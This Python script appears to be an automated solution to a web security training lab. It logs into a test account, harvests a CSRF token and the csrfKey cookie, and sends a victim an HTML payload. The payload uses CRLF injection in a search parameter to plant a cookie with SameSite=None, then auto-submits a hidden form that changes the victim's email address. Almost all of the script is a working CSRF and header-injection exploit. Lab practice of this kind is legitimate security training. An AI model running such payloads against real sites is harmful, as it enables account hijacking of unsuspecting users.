import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        "csrf": get_csrf_token(s, url, path),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def send_vuln_payload(s, exploit_url, exploit_path, payload): 
    target_url = exploit_url + exploit_path
    payload = {
        'urlIsHttps': 'on',
        'responseFile': '/exploit',
        'responseHead': 'HTTP/1.1 200 OK \
                        Content-Type: text/html; charset=utf-8',
        'responseBody': payload,
        'formAction': 'DELIVER_TO_VICTIM'
    }
    r = s.post(target_url, data=payload, allow_redirects=True)

    if r.status_code == 200:
        print('[+] Sent vuln request to exploit CORS vuln')
    else:
        print('[-] Fail to send vuln request')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <exploit_url>" % sys.argv[0])
        print("(+) Example: %s www.example.com www.abc.exploit-server.net" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 
    exploit_url = sys.argv[2][:-1] if sys.argv[2][-1] == '/' else sys.argv[2]

    
    login_acc(s, url, '/login', 'wiener', 'peter')
    valid_csrf = get_csrf_token(s, url, '/my-account')
    csrf_key = s.cookies.get_dict()['csrfKey']
    
    payload = f"""
        <body>
            <form method="POST" action="{url}/my-account/change-email">
                <input type="hidden" name="email" value="test@gmail.com">
                <input type="hidden" name="csrf" value="{valid_csrf}">
                <input type="submit" value="Submit Request">
            </form>
            <img src="{url}/?search=test%0d%0aSet-Cookie:%20csrfKey={csrf_key}%3b%20SameSite=None" onerror="document.forms[0].submit()">
        </body>
    """
    send_vuln_payload(s, exploit_url, '/', payload)
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()